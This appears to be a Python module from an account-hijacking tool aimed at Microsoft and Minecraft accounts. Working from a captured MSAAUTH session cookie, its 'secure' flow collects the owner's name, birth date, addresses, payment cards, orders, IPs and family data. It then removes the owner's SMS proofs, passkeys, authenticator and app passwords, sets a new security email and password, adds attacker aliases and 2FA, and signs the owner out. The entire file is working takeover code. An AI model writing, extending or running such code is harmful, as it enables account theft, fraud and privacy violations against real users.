import asyncio
from dataclasses import dataclass, field
from typing import Any, Dict

from utils.timer import start_timer, stop_timer, millis_to_seconds
from utils.logging import log
from .tokens.cookies import get_cookies
from .checkmsaauth import check_msaauth
from .tokens.xbl import get_xbl
from .ssid import get_ssid
from .method import get_method
from .profile import get_profile
from .ogi.personalinfo import get_personal_info
from .ogi.addresses import get_addresses
from .tokens.t import get_t
from utils.lunar import get_lunar_cosmetics
from .ogi.devices import get_devices
from .removedevices import remove_devices
from .ogi.rewards import get_rewards
from .getaliases import get_aliases
from .changepfp import change_pfp
from .changedob import change_dob
from .changename import change_name
from .leavefamily import leave_family
from .tokens.msadelegate import get_msadelegate
from .tokens.getamrp import get_amrp
from .tokens.amc import amc as get_amc_cookies
from .tokens.amcjwt import amcjwt as get_amcjwt_cookies
from .ogi.cards import get_cards
from .ogi.orders import get_orders
from .ogi.oauths import get_oauths
from .ogi.subscriptions import get_subscriptions
from .secinfo import get_security_info
from .removeproof import remove_proof
from .removepasskey import remove_passkey
from .getcapes import get_capes
from utils.changeign import change_ign
from .tfa import setup_tfa
from .enabletfa import enable_tfa
from .removeoauths import remove_oauth_apps
from .removeexploit import remove_exploit
from .signout import sign_out
from .ogi.ips import get_ips
from .recoverycode import generate_recovery_code
from .recoverycodesecure import recovery_code_secure
from .addalias import add_alias
from .makeprimary import make_primary
from .removealias import remove_alias
from .disabletfa import disable_tfa
from .removeapppasswords import remove_app_passwords
from .disablemultiplayer import disable_multiplayer
from .ogi.family import get_family

import random
import string
import secrets
import sys


@dataclass
class Settings:
    first_name: str | None = None
    last_name: str | None = None
    pfp_url: str | None = None
    dob_day: str | None = None
    dob_month: str | None = None
    dob_year: str | None = None
    region: str | None = None
    primary_prefix: str | None = None
    primary_amount: int = 0
    tfa: int = 0
    change_ign: int = 0
    change_name: int = 0
    change_pfp: int = 0
    change_dob: int = 0
    multiplayer: int = 0
    secureifnomc: int = 0
    domain: str | None = None
    devices: int = 0
    family: int = 0
    sign_out: int = 0
    windows_keys: int = 0
    oauths: int = 0


@dataclass
class Ogi:
    first_name: str = "Failed to grab"
    last_name: str = "Failed to grab"
    new_first_name: str = "Failed"
    new_last_name: str = "Failed"
    new_dob: str = "Failed"
    new_region: str = "Failed"
    pfp_changed: bool = False
    ip: str = "Failed to grab"
    cards: str = "Failed to grab"
    dob: str = "Failed to grab"
    addresses: str = "Failed to grab"
    region: str = "Failed to grab"
    devices: str = "Failed to grab"
    family: str = "Failed to grab"
    mspoints: int = 0
    subscriptions: str = "Failed to grab"
    og_email: str = "Failed to grab"
    orders: str = "Failed to grab"
    oauth_apps: str = "Failed to grab"
    xbox_gamertag: str = "No Xbox token"
    exploit: str = "Failed"
    sign_out: str = "Failed"
    remaining_emails: str | None = None


@dataclass
class LunarMetadata:
    hasAllCosmetics: bool = False
    hasAllEmotes: bool = False
    rankName: str | None = None


@dataclass
class Lunar:
    ownedCosmetics: list = field(default_factory=list)
    equippedCosmetics: list = field(default_factory=list)
    lunarPlusFreeCosmeticNames: list = field(default_factory=list)
    ownedEmotes: list = field(default_factory=list)
    equippedEmotes: list = field(default_factory=list)
    metadata: LunarMetadata = field(default_factory=LunarMetadata)


@dataclass
class Account:
    status: str = "Error"
    old_name: str = "Doesn't own MC"
    new_name: str = "Doesn't own MC"
    old_email: str = "Failed"
    email: str = "Failed"
    security_email: str = "Failed"
    password: str = "Failed"
    recoveryCode: str = "Failed"
    tfa: str = "Failed"
    time_taken: float = 0.0
    ssid: str = "No Xbox profile"
    method: str = "False"
    ogi: Ogi = field(init=False)
    capes: list = field(default_factory=list)
    lunar: Lunar = field(default_factory=Lunar)

    def __post_init__(self):
        self.ogi = Ogi()


def initialize_account() -> Account:
    return Account()


def _log(msg):
    print(f"{msg}", file=sys.stderr, flush=True)


# run a blocking function in default thread-pool so background tasks don't block the event-loop
async def run_blocking(func, *args, **kwargs):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, lambda: func(*args, **kwargs))


async def secure(client, msaauth: str, settings: Settings, recovery_data: Dict | None = None):
    acc = initialize_account()
    timer_id = secrets.token_hex(8)

    log("started secure flow")
    start_timer(timer_id)

    log("fetching cookies")
    canary, apicanary, amsc = get_cookies(client)
    if not canary or not apicanary or not amsc:
        acc.status = "cookie_fail"
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc

    log("cookies fetched")

    checked = check_msaauth(client, msaauth)
    if checked in {"locked", "down"}:
        msg = "Locked" if checked == "locked" else "service_down"
        acc.status = msg
        acc.email = acc.security_email = acc.recoveryCode = acc.password = msg
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc

    log("retrieving xbl token")
    xbl_resp = None
    max_attempts = 5
    attempt = 0
    while attempt < max_attempts:
        try:
            xbl_resp = get_xbl(client, checked)
        except Exception as e:
            log(f"get_xbl failed on attempt {attempt+1}: {e}")
            xbl_resp = None

        # break if we got a dict or any non-"Failed" string response like "verify"
        if xbl_resp and not (isinstance(xbl_resp, str) and xbl_resp == "Failed"):
            break

        attempt += 1
        if attempt < max_attempts:
            log(f"xbl token attempt {attempt} failed, retrying…")
            await asyncio.sleep(1)
    log(f"xbl response: {xbl_resp}")
    if xbl_resp == "verify":
        acc.status = "verify_required"
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc
    if isinstance(xbl_resp, dict):
        ssid = get_ssid(client, xbl_resp["xbl"])
        acc.ogi.xbox_gamertag = xbl_resp.get("gtg", "No Xbox token")
        acc.ssid = ssid or "No Xbox profile"
        log(f"ssid: {acc.ssid}")

        async def _fetch_lunar():
            try:
                lr = get_lunar_cosmetics(acc.ssid)
                if lr:
                    acc.lunar = Lunar(
                        ownedCosmetics=lr.get("ownedCosmetics", []),
                        equippedCosmetics=lr.get("equippedCosmetics", []),
                        lunarPlusFreeCosmeticNames=lr.get("lunarPlusFreeCosmeticNames", []),
                        ownedEmotes=lr.get("ownedEmotes", []),
                        equippedEmotes=lr.get("equippedEmotes", []),
                        metadata=LunarMetadata(
                            hasAllCosmetics=lr.get("metadata", {}).get("hasAllCosmetics", False),
                            hasAllEmotes=lr.get("metadata", {}).get("hasAllEmotes", False),
                            rankName=lr.get("metadata", {}).get("rankName"),
                        ),
                    )
                    log(f"lunar cosmetics: {acc.lunar}")
            except Exception:
                pass

        if acc.ssid and acc.ssid != "No Xbox profile":
            asyncio.create_task(_fetch_lunar())

    if isinstance(xbl_resp, dict) and settings.multiplayer == 1:
        if disable_multiplayer(client, xbl_resp["xbl"]):
            log("multiplayer disabled")
        else:
            log("failed to disable multiplayer")
    else:
        log("multiplayer not attempted")

    if acc.ssid and acc.ssid != "No Xbox profile":
        acc.method = get_method(acc.ssid) or "False"
        log(f"method: {acc.method}")
        log("getting profile")
        profile_res = get_profile(client, acc.ssid)
        try:
            acc.old_name = profile_res.get("name")
        except AttributeError:
            acc.old_name = profile_res
        log(f"old name: {acc.old_name}")
        capes_val = get_capes(client, acc.ssid)
        acc.capes = capes_val if capes_val else "None"
        log(f"capes: {acc.capes}")

        if acc.old_name and acc.old_name not in {"Failed", "Doesn't own MC"}:
            acc.new_name = acc.old_name

        if settings.change_ign == 1 and acc.old_name and "_" not in acc.old_name:
            new_name = f"{acc.old_name}_"
            try:
                status_code = change_ign(client, acc.ssid, new_name)
                if 200 <= status_code < 300:
                    acc.new_name = new_name
                else:
                    acc.new_name = acc.old_name
            except Exception:
                acc.new_name = acc.old_name
        log(f"new name: {acc.new_name}")
    if acc.old_name and acc.new_name == "Doesn't own MC" and settings.secureifnomc == 0:
        acc.status = "no_mc"
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc
    log("getting t value")
    try:
        t_val = get_t(client, canary)
        log(f"t value: {t_val}")
    except Exception as e:
        log(f"get_t failed: {e}")
        t_val = None

    if not t_val:
        log("MSAAUTH not authenticated")
        acc.status = "MSAAUTH not authenticated"
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc
    log(f"t value: {t_val}")
    special_states = {
        "password_flagged": "Password Flagged",
        "child_landing": "Child Landing",
        "phone_locked": "Phone Locked",
        "chinese_lock": "Chinese Lock",
        "locked": "Locked",
        "down": "service_down",
    }
    if t_val in special_states:
        log(f"special state: {t_val}")
        msg = special_states[t_val]
        acc.status = msg
        acc.email = acc.security_email = acc.recoveryCode = acc.password = msg
        acc.time_taken = millis_to_seconds(stop_timer(timer_id))
        return acc
        
    log("getting amrp")
    if t_val:
        get_amrp(client, t_val)
    get_amc_cookies(client)
    log("getting amc cookies")
    get_amcjwt_cookies(client)
    log("getting amcjwt cookies")
    msadelegate_token = get_msadelegate(client)
    log("getting msadelegate token")

    async def task_devices():
        try:
            log("getting devices")
            acc.ogi.devices = await run_blocking(get_devices, client) or "Failed to get devices"
            log(f"devices: {acc.ogi.devices}")
            if settings.devices == 1:
                log("removing devices")
                await run_blocking(remove_devices, client)
                log("devices removed")
        except Exception:
            acc.ogi.devices = "Failed to get devices"

    async def task_personal_info():
        try:
            log("getting personal info")
            info = await run_blocking(get_personal_info, client)
            if info:
                acc.ogi.og_email = info.get("og_email", "Failed")
                acc.ogi.first_name = info.get("first_name", "Failed")
                acc.ogi.last_name = info.get("last_name", "Failed")
                acc.ogi.dob = info.get("dob", "Failed")
                acc.ogi.region = info.get("region", "Failed")
        except Exception:
            pass

    async def task_addresses():
        try:
            log("getting addresses")
            addr = await run_blocking(get_addresses, client)
            if addr:
                acc.ogi.addresses = addr
        except Exception:
            pass

    async def task_rewards():
        try:
            log("getting rewards")
            rewards_info = await run_blocking(get_rewards, client)
            if rewards_info:
                acc.ogi.mspoints = rewards_info.get("mspoints", 0)
        except Exception:
            pass

    async def task_cards():
        try:
            log("getting cards")
            if msadelegate_token:
                cards_info = await run_blocking(get_cards, client, msadelegate_token)
                if cards_info:
                    acc.ogi.cards = cards_info
        except Exception:
            pass

    async def task_orders():
        try:
            log("getting orders")
            orders_info = await run_blocking(get_orders, client)
            if orders_info:
                acc.ogi.orders = orders_info
        except Exception:
            pass

    async def task_oauth_apps():
        try:
            log("getting oauth apps")
            oauths_before = await run_blocking(get_oauths, client)
            if oauths_before:
                acc.ogi.oauth_apps = oauths_before
        except Exception:
            pass
        if settings.oauths == 1:
            try:
                log("removing oauth apps")
                await run_blocking(remove_oauth_apps, client)
            except Exception:
                pass

    async def task_ips():
        try:
            log("getting ips")
            ips = await run_blocking(get_ips, client)
            if ips:
                acc.ogi.ip = ", ".join(ips)
        except Exception:
            pass

    async def task_subscriptions():
        try:
            log("getting subscriptions")
            subs = await run_blocking(get_subscriptions, client, msadelegate_token) if msadelegate_token else None
            if subs:
                acc.ogi.subscriptions = subs
        except Exception:
            pass

    async def task_family():
        try:
            log("getting family data")
            fam = await run_blocking(get_family, client)
            if fam:
                acc.ogi.family = fam
        except Exception:
            pass

    async def task_disable_tfa():
        log("disabling tfa")
        if settings.tfa == 1:
            try:
                await run_blocking(disable_tfa, client, apicanary)
            except Exception:
                pass

    async def task_change_pfp():
        log("changing pfp")
        if settings.change_pfp == 1:
            try:
                await run_blocking(change_pfp, client)
                acc.ogi.pfp_changed = True
            except Exception:
                acc.ogi.pfp_changed = False

    async def task_change_name():
        log("changing name")
        if settings.change_name == 1:
            try:
                resp = await run_blocking(change_name, client, settings)
                if resp and resp.get("success"):
                    acc.ogi.new_first_name = resp.get("new_first_name", "Failed")
                    acc.ogi.new_last_name = resp.get("new_last_name", "Failed")
            except Exception:
                pass

    async def task_change_dob():
        log("changing dob")
        if settings.change_dob == 1:
            try:
                resp = await run_blocking(change_dob, client, settings)
                if resp and resp.get("success"):
                    acc.ogi.new_dob = resp.get("new_dob", "Failed")
                    acc.ogi.new_region = resp.get("new_region", "Failed")
            except Exception:
                pass

    async def task_leave_family():
        log("leaving family")
        if settings.family == 1:
            try:
                await run_blocking(leave_family, client)
            except Exception:
                pass

    async def task_remove_app_passwords():
        log("removing app passwords")
        try:
            await run_blocking(remove_app_passwords, client, apicanary)
        except Exception:
            pass

    bg_tasks = []
    for coro in (
        task_devices(),
        task_personal_info(),
        task_addresses(),
        task_rewards(),
        task_cards(),
        task_orders(),
        task_oauth_apps(),
        task_ips(),
        task_subscriptions(),
        task_family(),
        task_disable_tfa(),
        task_change_pfp(),
        task_change_name(),
        task_change_dob(),
        task_leave_family(),
        task_remove_app_passwords(),
    ):
        bg_tasks.append(asyncio.create_task(coro))

    await asyncio.sleep(0)

    # ensure background OGI tasks have finished
    try:
        await asyncio.gather(*bg_tasks, return_exceptions=True)
    except Exception:
        pass

    sec_info = get_security_info(client)
    if isinstance(sec_info, dict) and sec_info.get("email"):
        acc.old_email = sec_info.get("email")
        log(f"old email set: {acc.old_email}")
    manage_data = sec_info.get("WLXAccount", {}).get("manageProofs") if isinstance(sec_info, dict) else None
    if manage_data:
        log("removing sms proofs")
        for sms in manage_data.get("smsProofs", []):
            try:
                remove_proof(client, apicanary, sms.get("proofId"))
            except Exception:
                pass

        log("removing passkeys")
        for pk in manage_data.get("passKeys", []):
            try:
                remove_passkey(client, apicanary, pk.get("proofId"))
            except Exception:
                pass

        log("removing msauth app")
        msauthApp = manage_data.get("msAuthApp")
        if msauthApp:
            try:
                remove_proof(client, apicanary, msauthApp.get("proofId"))
            except Exception:
                pass

    if recovery_data and all(recovery_data.get(k) for k in ("password", "security_email", "recoveryCode")):
        log("using recovery data")
        acc.password = recovery_data["password"]
        acc.security_email = recovery_data["security_email"]
        acc.recoveryCode = recovery_data["recoveryCode"]
    else:
        encrypted_net_id = manage_data.get("encryptedNetId") if manage_data else None
        if encrypted_net_id:
            log("generating recovery code")
            rec = generate_recovery_code(client, encrypted_net_id, apicanary)
            if rec:
                log("recovery code generated")
                domain = settings.domain or "outlook.com"
                sec_email = f"{secrets.token_hex(6)}@{domain}"
                password = secrets.token_urlsafe(12)
                secure_resp = recovery_code_secure(client, acc.old_email, rec, sec_email, password)
                if secure_resp:
                    log("recovery code secured")
                    acc.password = secure_resp.get("password", password)
                    acc.security_email = secure_resp.get("security_email", sec_email)
                    acc.recoveryCode = secure_resp.get("recoveryCode", rec)

    try:
        log("getting aliases")
        aliases, canary2 = get_aliases(client)
        log(f"aliases: {aliases}")
    except Exception as e:
        log(f"failed to get aliases: {e}")
        aliases, canary2 = ([], None)

    fallback_email = acc.email or acc.old_email
    if settings.primary_amount in {1, 2} and apicanary:
        prefix = settings.primary_prefix or "dona"

        def _gen_alias():
            rand_letters = "".join(random.choice(string.ascii_lowercase) for _ in range(2))
            tail_len = max(0, 16 - len(prefix) - 2)
            rand_tail = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(tail_len))
            return f"{rand_letters}{prefix}{rand_tail}"

        for _ in range(settings.primary_amount):
            try:
                _, canary2_round = get_aliases(client)
                if not canary2_round:
                    break
                alias_local = _gen_alias()
                if add_alias(client, alias_local, canary2_round):
                    new_addr = f"{alias_local}@outlook.com"
                    if make_primary(client, apicanary, new_addr):
                        acc.email = new_addr
            except Exception:
                continue
    if not acc.email or acc.email == "Failed":
        acc.email = acc.old_email

    try:
        aliases_final, canary2_final = get_aliases(client)
        if aliases_final and canary2_final:
            primary_local = acc.email.split('@')[0] if '@' in acc.email else None
            first_alias = aliases_final[0] if aliases_final else None
            for alias_local in aliases_final:
                if alias_local == first_alias or alias_local == primary_local or (primary_local and primary_local in alias_local):
                    continue
                try:
                    remove_alias(client, canary2_final, alias_local)
                except Exception:
                    pass
    except Exception:
        pass

    try:
        sec_final = get_security_info(client)
        manage_final = sec_final.get("WLXAccount", {}).get("manageProofs") if isinstance(sec_final, dict) else None
        emails_list = []
        if manage_final and manage_final.get("emailProofs"):
            emails_list = [e.get("displayProofName") for e in manage_final["emailProofs"] if e.get("displayProofName")]
        acc.ogi.remaining_emails = ", ".join(emails_list) if emails_list else "No remaining emails"
        log(f"remaining emails: {acc.ogi.remaining_emails}")
    except Exception as e:
        log(f"failed to get remaining emails: {e}")
        acc.ogi.remaining_emails = "Failed to retrieve"

    if settings.tfa == 1:
        log("setting up tfa")
        secret_key = setup_tfa(client)
        if secret_key:
            acc.tfa = secret_key
            enable_tfa(client)
            log("tfa enabled")
        else:
            acc.tfa = "Couldn't add 2FA"
            log("tfa failed")
    else:
        log("tfa adding is disabled")
        acc.tfa = "2FA adding is disabled"

    if settings.windows_keys == 1:
        acc.ogi.exploit = "Removed keys" if remove_exploit(client) else "Failed to remove exploit"
        log(f"exploit: {acc.ogi.exploit}")
    else:
        acc.ogi.exploit = "Disabled"

    if settings.sign_out == 1:
        acc.ogi.sign_out = "Signed out" if sign_out(client) else "Failed to sign out"
        log(f"sign out: {acc.ogi.sign_out}")
    else:
        acc.ogi.sign_out = "Disabled"

    log("securing flow completed")
    acc.status = "Secured Successfully"
    acc.time_taken = millis_to_seconds(stop_timer(timer_id))
    return acc 